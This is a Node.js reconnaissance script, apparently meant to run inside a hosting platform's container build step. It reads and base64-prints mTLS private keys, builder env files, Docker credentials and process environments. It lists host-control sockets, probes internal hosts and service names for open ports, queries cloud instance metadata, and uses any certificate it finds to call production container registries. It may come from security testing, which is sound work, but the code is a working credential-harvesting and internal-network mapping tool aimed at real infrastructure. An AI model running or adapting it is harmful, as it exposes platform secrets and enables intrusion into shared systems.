// i73754 collect: what is visible from the railpack BUILD step (RUN) vantage.
// read-only: file listing/dump, tcp reachability, dns, cloud metadata, registry GET /v2/
const fs = require('fs');
const net = require('net');
const dns = require('dns');
const https = require('https');
const http = require('http');
const os = require('os');

const T0 = Date.now();
const CAP = 175000;
let used = 0;
function say(s) {
  s = String(s);
  if (used > CAP) { if (used < CAP + 2000) { used += 2000; console.log('CAP_REACHED'); } return; }
  if (s.length > 1500) s = s.slice(0, 1500) + '...TRUNC';
  used += s.length + 1;
  console.log(s);
}

function existsP(p) { try { fs.statSync(p); return true; } catch (e) { return false; } }

function dumpFile(p, cap) {
  let st;
  try { st = fs.statSync(p); } catch (e) { say('FMISS ' + p + ' (' + (e.code || 'ERR') + ')'); return; }
  if (!st.isFile()) { say('FNOTFILE ' + p); return; }
  let b;
  try { b = fs.readFileSync(p); } catch (e) { say('FERR ' + p + ' ' + (e.code || '')); return; }
  const n = Math.min(b.length, cap || 20000);
  say('FBEGIN ' + p + ' size=' + b.length + ' take=' + n + ' mode=' + (st.mode & 0o7777).toString(8));
  const s = b.slice(0, n).toString('base64');
  for (let i = 0; i < s.length; i += 800) say('B64 ' + s.slice(i, i + 800));
  say('FEND ' + p);
}

function lsdir(p, maxdepth, maxent) {
  let depth0 = 0, ent = 0, names = 0;
  function walk(d, depth) {
    let items;
    try { items = fs.readdirSync(d); } catch (e) { say('LSERR ' + d + ' ' + (e.code || '')); return; }
    items.sort();
    for (const name of items) {
      const q = d + '/' + name;
      let st;
      try { st = fs.lstatSync(q); } catch (e) { say('LS? ' + q + ' ' + (e.code || '')); continue; }
      let t = st.isSymbolicLink() ? 'l' : (st.isDirectory() ? 'd' : (st.isFile() ? 'f' : 'o'));
      let link = '';
      if (t === 'l') { try { link = ' -> ' + fs.readlinkSync(q); } catch (e) { } }
      say('@@' + t + ' ' + q + ' ' + (st.mode & 0o7777).toString(8) + ' ' + st.size + link);
      ent++; names++;
      if (ent >= maxent) { say('@@CAP ' + d); return; }
      if (t === 'd' && depth < maxdepth) { walk(q, depth + 1); if (ent >= maxent) return; }
    }
  }
  walk(p, 1);
}

function tcp(host, port, ms) {
  return new Promise((resolve) => {
    let done = false;
    const s = net.connect({ host: host, port: port });
    const t = setTimeout(() => { if (!done) { done = true; s.destroy(); resolve('TIMEOUT'); } }, ms || 2500);
    s.on('connect', () => { if (!done) { done = true; clearTimeout(t); s.destroy(); resolve('OPEN'); } });
    s.on('error', (e) => { if (!done) { done = true; clearTimeout(t); resolve('ERR:' + (e.code || e.message)); } });
  });
}

function lookup(name, ms) {
  return new Promise((resolve) => {
    let done = false;
    const t = setTimeout(() => { if (!done) { done = true; resolve('TIMEOUT'); } }, ms || 2500);
    dns.lookup(name, { all: true }, (err, addrs) => {
      if (done) return; done = true; clearTimeout(t);
      if (err) return resolve('ERR:' + (err.code || 'E'));
      resolve(addrs.map(a => a.address).join(','));
    });
  });
}

function httpGet(url, headers, ms) {
  return new Promise((resolve) => {
    let done = false;
    const t = setTimeout(() => { if (!done) { done = true; resolve('TIMEOUT'); } }, ms || 3000);
    try {
      const mod = url.startsWith('https') ? https : http;
      const req = mod.get(url, { headers: headers || {}, timeout: ms || 3000 }, (r) => {
        let b = '';
        r.on('data', c => { if (b.length < 1500) b += c; });
        r.on('end', () => { if (!done) { done = true; clearTimeout(t); resolve(r.statusCode + ' ' + b.replace(/\s+/g, ' ').slice(0, 400)); } });
      });
      req.on('error', (e) => { if (!done) { done = true; clearTimeout(t); resolve('ERR:' + (e.code || e.message)); } });
      req.on('timeout', () => { req.destroy(); });
    } catch (e) { if (!done) { done = true; clearTimeout(t); resolve('EXC:' + e.message); } }
  });
}

function regGet(host, path, crt, key, ms) {
  return new Promise((resolve) => {
    let done = false;
    const t = setTimeout(() => { if (!done) { done = true; resolve('TIMEOUT'); } }, ms || 5000);
    const opts = {
      host: host, port: 443, path: path, method: 'GET',
      rejectUnauthorized: false,
      servername: host,
      headers: { 'Accept': 'application/json, application/vnd.oci.image.index.v1+json' }
    };
    if (crt && key) { try { opts.cert = fs.readFileSync(crt); opts.key = fs.readFileSync(key); } catch (e) { } }
    try {
      const req = https.request(opts, (r) => {
        let b = '';
        r.on('data', c => { if (b.length < 600) b += c; });
        r.on('end', () => { if (!done) { done = true; clearTimeout(t); resolve('HTTP' + r.statusCode + ' ' + b.replace(/\s+/g, ' ').slice(0, 200)); } });
      });
      req.on('error', (e) => { if (!done) { done = true; clearTimeout(t); resolve('ERR:' + (e.code || e.message)); } });
      req.end();
    } catch (e) { if (!done) { done = true; clearTimeout(t); resolve('EXC:' + e.message); } }
  });
}

(async function main() {
  try {
    say('===I73754_BEGIN=== ' + new Date().toISOString());
    say('HOST ' + os.hostname() + ' uname=' + os.type() + ' ' + os.release() + ' ' + os.arch());
    say('UID ' + (typeof process.getuid === 'function' ? process.getuid() : '?') + ' CWD ' + process.cwd());
    try { say('KERNEL ' + fs.readFileSync('/proc/version', 'utf8').trim().slice(0, 200)); } catch (e) { say('KERNEL_ERR ' + e.code); }
    try { say('CMDLINE1 ' + fs.readFileSync('/proc/1/cmdline').toString('utf8').replace(/\0/g, ' ').slice(0, 300)); } catch (e) { say('CMDLINE1_ERR ' + e.code); }

    // ---- group A: filesystem surface ----
    say('---LSROOT---'); lsdir('/', 1, 40);
    for (const d of ['/var/lib', '/var/lib/railwayapp', '/var/lib/railwayapp/mtls', '/var/lib/railwayapp/mtls-pki',
      '/var/lib/railwayapp/env', '/etc/builderv3', '/etc/buildkit', '/etc/docker', '/root/.docker',
      '/run/secrets', '/var/lib/builderv3', '/var/lib/buildkit', '/var/run', '/data']) {
      say('---LS ' + d + '---');
      if (!existsP(d)) { say('LSMISS ' + d); continue; }
      lsdir(d, 2, 60);
    }
    const files = [
      ['/var/lib/railwayapp/mtls/tls.crt', 8000], ['/var/lib/railwayapp/mtls/tls.key', 8000],
      ['/var/lib/railwayapp/mtls/ca.crt', 8000],
      ['/var/lib/railwayapp/mtls-pki/client.crt', 8000], ['/var/lib/railwayapp/mtls-pki/client.key', 8000],
      ['/var/lib/railwayapp/mtls-pki/client-ca.202812.crt', 4000],
      ['/var/lib/railwayapp/mtls-pki/root-ca.202812.crt', 4000],
      ['/var/lib/railwayapp/mtls-pki/server.crt', 4000],
      ['/var/lib/railwayapp/mtls-pki/server-ca-bundle.crt', 6000],
      ['/etc/builderv3/builderv3.env', 8000], ['/etc/buildkit/buildkitd.env', 8000],
      ['/root/.docker/config.json', 6000], ['/proc/1/environ', 8000], ['/proc/self/environ', 8000],
      ['/etc/hosts', 3000], ['/etc/resolv.conf', 2000], ['/etc/hostname', 500], ['/etc/machine-id', 500],
      ['/proc/1/root/var/lib/railwayapp/mtls/tls.crt', 4000]
    ];
    for (const f of files) dumpFile(f[0], f[1]);
    // env names + values of our own build container (self-controlled)
    const envs = [];
    for (const k of Object.keys(process.env).sort()) {
      const v = process.env[k];
      envs.push(k + '=' + (v && v.length > 120 ? v.slice(0, 120) + '...' : v));
    }
    say('---ENV---');
    for (const e of envs) say('ENV ' + e);
    say('ENVCOUNT ' + envs.length);

    // sockets that would give host control
    say('---SOCK---');
    for (const s of ['/var/run/docker.sock', '/run/docker.sock', '/run/buildkit/buildkitd.sock',
      '/var/run/buildkit/buildkitd.sock', '/run/containerd/containerd.sock', '/run/k3s/containerd/containerd.sock']) {
      say('SOCK ' + s + ' exists=' + existsP(s));
    }

    // ---- group B: network reachability ----
    say('---NET---');
    const tcpT = [
      ['1.1.1.1', 443], ['8.8.8.8', 53], ['169.254.169.254', 80], ['169.254.169.254', 53],
      ['35.247.70.7', 443], ['35.247.70.7', 5143], ['35.247.70.7', 7422], ['35.247.70.7', 8480],
      ['10.10.10.198', 8481], ['10.10.10.58', 8480]
    ];
    for (const t of tcpT) say('TCP ' + t[0] + ':' + t[1] + ' ' + await tcp(t[0], t[1], 2500));

    const names = ['backboard', 'pg-bouncer', 'orchestrator', 'temporal', 'stacker', 'storage-cp',
      'network-cp', 'metal-cp', 'registry', 'vminsert', 'vmselect', 'nats', 'railway.internal',
      'metadata.google.internal', 'external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'];
    for (const n of names) {
      const r1 = await lookup(n + '.railway.internal', 2500);
      say('DNS ' + n + '.railway.internal => ' + r1);
    }
    for (const n of ['backboard.backboard.svc.cluster.local', 'pg-bouncer.network-cp.svc.cluster.local',
      'orchestrator.orchestrator.svc.cluster.local', 'temporal.temporal.svc.cluster.local']) {
      say('DNS ' + n + ' => ' + await lookup(n, 2500));
    }
    const resolved = [['backboard', 8080], ['pg-bouncer', 6432], ['orchestrator', 8775], ['orchestrator', 8776],
      ['temporal', 7233], ['stacker', 8081], ['storage-cp', 8777], ['network-cp', 8442], ['network-cp', 8085],
      ['metal-cp', 8774], ['registry', 5000], ['vminsert', 8480], ['nats', 7422]];
    for (const r of resolved) {
      const ip = await lookup(r[0] + '.railway.internal', 2000);
      if (ip.indexOf('ERR') !== 0 && ip !== 'TIMEOUT') {
        const first = ip.split(',')[0].trim();
        say('TCPR ' + r[0] + ':' + r[1] + ' ip=' + first + ' ' + await tcp(first, r[1], 2500));
      }
    }

    // ---- group C: cloud metadata (read-only, no token calls) ----
    say('---META---');
    const mh = { 'Metadata-Flavor': 'Google' };
    for (const p of ['/computeMetadata/v1/project/project-id', '/computeMetadata/v1/instance/name',
      '/computeMetadata/v1/instance/service-accounts/default/email', '/computeMetadata/v1/instance/zone']) {
      say('META ' + p + ' => ' + await httpGet('http://169.254.169.254' + p, mh, 2500));
    }
    say('META metadata.google.internal => ' + await httpGet('http://metadata.google.internal/computeMetadata/v1/project/project-id', mh, 2500));

    // ---- group D: registry read-only if a client identity is visible ----
    say('---REG---');
    const crt = '/var/lib/railwayapp/mtls/tls.crt', key = '/var/lib/railwayapp/mtls/tls.key';
    const have = existsP(crt) && existsP(key);
    say('REGCERT visible=' + have);
    if (have) {
      const shards = ['production-us-east4-eqdc4a', 'production-europe-west4-drams3a',
        'production-asia-southeast1-eqsg3a', 'production-dpsjc', 'production-dpams', 'production-us-west2'];
      for (const s of shards) {
        say('REG ' + s + ' => ' + await regGet(s + '.railway-registry.com', '/v2/', crt, key, 5000));
      }
    }
    say('===I73754_END=== elapsed_ms=' + (Date.now() - T0));
  } catch (e) {
    say('FATAL ' + (e && e.stack ? e.stack.slice(0, 500) : e));
    say('===I73754_END_ERR===');
  }
})();
